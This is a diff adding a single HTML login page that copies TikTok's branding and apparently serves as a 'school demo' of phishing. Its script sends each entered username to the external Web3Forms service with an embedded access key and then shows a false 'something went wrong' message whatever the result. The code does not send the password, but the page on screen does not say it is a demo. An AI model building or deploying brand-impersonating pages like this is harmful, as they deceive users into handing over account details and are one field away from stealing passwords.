@@ -1,0 +1,563 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok | Log in</title><style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
+
+    body {
+        font-family: Arial, Helvetica, sans-serif;
+        color: #161823;
+        background: #fff;
+        min-height: 100vh;
+    }
+
+    header {
+        height: 70px;
+        padding: 0 7%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid #eee;
+    }
+
+    .logo {
+        font-size: 29px;
+        font-weight: 800;
+        color: #161823;
+        letter-spacing: -1px;
+    }
+
+    .logo span {
+        color: #fe2c55;
+    }
+
+    .help {
+        color: #333;
+        font-size: 14px;
+        text-decoration: none;
+    }
+
+    main {
+        width: 100%;
+        max-width: 440px;
+        margin: 65px auto 45px;
+        padding: 0 25px;
+    }
+
+    h1 {
+        font-size: 30px;
+        text-align: center;
+        margin-bottom: 12px;
+    }
+
+    .subtitle {
+        text-align: center;
+        color: #777;
+        font-size: 14px;
+        margin-bottom: 35px;
+        line-height: 1.5;
+    }
+
+    .tabs {
+        display: flex;
+        border-bottom: 1px solid #e5e5e5;
+        margin-bottom: 28px;
+    }
+
+    .tab {
+        flex: 1;
+        padding: 14px 5px;
+        background: none;
+        border: none;
+        border-bottom: 2px solid transparent;
+        font-size: 15px;
+        color: #777;
+        cursor: pointer;
+    }
+
+    .tab.active {
+        color: #161823;
+        font-weight: bold;
+        border-bottom-color: #161823;
+    }
+
+    .form-group {
+        margin-bottom: 17px;
+    }
+
+    label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 9px;
+    }
+
+    input {
+        width: 100%;
+        height: 48px;
+        border: 1px solid #d8d8d8;
+        background: #f8f8f8;
+        border-radius: 4px;
+        padding: 0 13px;
+        font-size: 15px;
+        outline: none;
+    }
+
+    input:focus {
+        border-color: #999;
+    }
+
+    .password-wrap {
+        position: relative;
+    }
+
+    .password-wrap input {
+        padding-right: 70px;
+    }
+
+    .show-password {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        border: none;
+        background: transparent;
+        cursor: pointer;
+        color: #555;
+        font-size: 13px;
+    }
+
+    .forgot {
+        display: block;
+        margin: 4px 0 24px;
+        text-align: right;
+        color: #555;
+        font-size: 13px;
+        text-decoration: none;
+    }
+
+    .login-button {
+        width: 100%;
+        height: 48px;
+        border: none;
+        border-radius: 4px;
+        background: #fe2c55;
+        color: #fff;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+
+    .login-button:hover {
+        background: #e6254c;
+    }
+
+    .login-button:disabled {
+        opacity: 0.65;
+        cursor: not-allowed;
+    }
+
+    .status {
+        margin-top: 15px;
+        text-align: center;
+        color: #d62545;
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .divider {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin: 27px 0;
+        color: #999;
+        font-size: 12px;
+    }
+
+    .divider::before,
+    .divider::after {
+        content: "";
+        height: 1px;
+        background: #eee;
+        flex: 1;
+    }
+
+    .social-button {
+        width: 100%;
+        height: 46px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: white;
+        margin-bottom: 12px;
+        font-size: 14px;
+        cursor: pointer;
+    }
+
+    .social-button:hover {
+        background: #f8f8f8;
+    }
+
+    .signup {
+        border-top: 1px solid #eee;
+        margin-top: 28px;
+        padding-top: 25px;
+        text-align: center;
+        font-size: 14px;
+        color: #777;
+    }
+
+    .signup a {
+        color: #fe2c55;
+        font-weight: bold;
+        text-decoration: none;
+        margin-left: 4px;
+    }
+
+    .qr-panel {
+        display: none;
+        text-align: center;
+        padding: 10px 0 20px;
+    }
+
+    .qr-panel p {
+        color: #555;
+        font-size: 14px;
+        line-height: 1.6;
+        margin-bottom: 20px;
+    }
+
+    .qr-placeholder {
+        width: 180px;
+        height: 180px;
+        margin: 0 auto 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 1px solid #eee;
+        background:
+            repeating-linear-gradient(
+                45deg,
+                #fff,
+                #fff 6px,
+                #f3f3f3 6px,
+                #f3f3f3 12px
+            );
+        color: #555;
+        font-weight: bold;
+        font-size: 13px;
+    }
+
+    footer {
+        text-align: center;
+        border-top: 1px solid #eee;
+        padding: 22px 15px;
+        font-size: 12px;
+        color: #888;
+        line-height: 1.8;
+    }
+
+    .demo-note {
+        margin-top: 16px;
+        text-align: center;
+        font-size: 12px;
+        color: #777;
+        line-height: 1.5;
+    }
+
+    @media (max-width: 480px) {
+        header {
+            padding: 0 20px;
+            height: 62px;
+        }
+
+        .logo {
+            font-size: 25px;
+        }
+
+        main {
+            margin-top: 42px;
+            padding: 0 22px;
+        }
+
+        h1 {
+            font-size: 27px;
+        }
+    }
+</style>
+
+</head><body>
+    <header>
+        <div class="logo">Tik<span>Tok</span></div>
+        <a class="help" href="#" id="helpLink">Feedback & help</a>
+    </header><main>
+    <h1>Log in to TikTok</h1>
+
+    <p class="subtitle">
+        Discover videos, share moments, and connect with people.
+    </p>
+
+    <div class="tabs">
+        <button class="tab active" id="emailTab" type="button">
+            Username
+        </button>
+
+        <button class="tab" id="qrTab" type="button">
+            QR code
+        </button>
+    </div>
+
+    <section id="loginPanel">
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input
+                    type="text"
+                    id="username"
+                    name="username"
+                    placeholder="Enter username"
+                    autocomplete="off"
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="demoPassword"> password</label>
+
+                <div class="password-wrap">
+                    <input
+                        type="password"
+                        id="demoPassword"
+                        placeholder="Enter password"
+                        autocomplete="off"
+                        required
+                    >
+
+                    <button
+                        type="button"
+                        class="show-password"
+                        id="showPassword"
+                    >
+                        Show
+                    </button>
+                </div>
+            </div>
+
+            <a class="forgot" href="#" id="forgotLink">
+                Forgot password?
+            </a>
+
+            <button
+                type="submit"
+                class="login-button"
+                id="loginButton"
+            >
+                Log in
+            </button>
+
+            <p
+                class="status"
+                id="formStatus"
+                role="status"
+                aria-live="polite"
+            ></p>
+        </form>
+
+        <div class="divider">OR</div>
+
+        <button class="social-button" id="googleButton" type="button">
+            Continue with Google
+        </button>
+
+        <button class="social-button" id="facebookButton" type="button">
+            Continue with Facebook
+        </button>
+
+        <div class="signup">
+            New to TikTok?
+            <a href="#" id="signupLink">Create an account</a>
+        </div>
+    </section>
+
+    <section class="qr-panel" id="qrPanel">
+        <div class="qr-placeholder">QR CODE</div>
+
+        <p>
+            QR-based login system 
+        </p>
+
+        <button class="social-button" id="backButton" type="button">
+            Back to username
+        </button>
+    </section>
+</main>
+
+<footer>
+    <p>© tikTok 2026</p>
+</footer>
+
+<script>
+    /*
+     * WEB3FORMS CONFIGURATION
+     *
+     * This demo sends only the username and a fixed test message.
+     * It deliberately does not send the password field.
+     */
+
+    const WEB3FORMS_ACCESS_KEY = "4ad36136-ce87-45b7-a2d5-283aa9592e68";
+
+    const loginForm = document.getElementById("loginForm");
+    const loginButton = document.getElementById("loginButton");
+    const formStatus = document.getElementById("formStatus");
+
+    loginForm.addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        const username = document
+            .getElementById("username")
+            .value
+            .trim();
+
+        if (!username) {
+            formStatus.textContent = "Please enter a demo username.";
+            return;
+        }
+
+        if (
+            !WEB3FORMS_ACCESS_KEY ||
+            WEB3FORMS_ACCESS_KEY === "YOUR_WEB3FORMS_ACCESS_KEY"
+        ) {
+            formStatus.textContent = "Sorry, something went wrong.";
+            console.error("Add your Web3Forms access key to configure the demo.");
+            return;
+        }
+
+        loginButton.disabled = true;
+        formStatus.textContent = "Submitting...";
+
+        const formData = new FormData();
+
+        formData.append("access_key", WEB3FORMS_ACCESS_KEY);
+        formData.append("name", username);
+        formData.append(
+            "subject",
+            "LikeTok School Demo Submission"
+        );
+        formData.append(
+            "message",
+            "A user submitted the LikeTok school demonstration form. No password was collected or sent."
+        );
+
+        try {
+            const response = await fetch(
+                "https://api.web3forms.com/submit",
+                {
+                    method: "POST",
+                    body: formData
+                }
+            );
+
+            const result = await response.json();
+
+            if (response.ok && result.success) {
+                formStatus.textContent =
+                    "Sorry, something went wrong.";
+            } else {
+                formStatus.textContent =
+                    "Sorry, something went wrong.";
+            }
+        } catch (error) {
+            formStatus.textContent =
+                "Sorry, something went wrong.";
+
+            console.error("Demo form submission failed.");
+        } finally {
+            loginButton.disabled = false;
+        }
+    });
+
+    // Show or hide the demo password locally.
+    document
+        .getElementById("showPassword")
+        .addEventListener("click", function () {
+            const passwordField =
+                document.getElementById("demoPassword");
+
+            const isHidden =
+                passwordField.type === "password";
+
+            passwordField.type = isHidden ? "text" : "password";
+            this.textContent = isHidden ? "Hide" : "Show";
+        });
+
+    // Switch between the username form and QR demo panel.
+    const emailTab = document.getElementById("emailTab");
+    const qrTab = document.getElementById("qrTab");
+    const loginPanel = document.getElementById("loginPanel");
+    const qrPanel = document.getElementById("qrPanel");
+
+    emailTab.addEventListener("click", function () {
+        emailTab.classList.add("active");
+        qrTab.classList.remove("active");
+
+        loginPanel.style.display = "block";
+        qrPanel.style.display = "none";
+    });
+
+    qrTab.addEventListener("click", function () {
+        qrTab.classList.add("active");
+        emailTab.classList.remove("active");
+
+        loginPanel.style.display = "none";
+        qrPanel.style.display = "block";
+    });
+
+    document
+        .getElementById("backButton")
+        .addEventListener("click", function () {
+            emailTab.click();
+        });
+
+    // Demo-only actions.
+    document
+        .getElementById("forgotLink")
+        .addEventListener("click", function (event) {
+            event.preventDefault();
+            alert("Password recovery is not configured in this demo.");
+        });
+
+    document
+        .getElementById("signupLink")
+        .addEventListener("click", function (event) {
+            event.preventDefault();
+            alert("Account creation is not configured in this demo.");
+        });
+
+    document
+        .getElementById("googleButton")
+        .addEventListener("click", function () {
+            alert("Google authentication is not configured in this demo.");
+        });
+
+    document
+        .getElementById("facebookButton")
+        .addEventListener("click", function () {
+            alert("Facebook authentication is not configured in this demo.");
+        });
+
+    document
+        .getElementById("helpLink")
+        .addEventListener("click", function (event) {
+            event.preventDefault();
+            alert("This is a school project demonstration.");
+        });
+</script>
+
+</body>
+          </html>
+
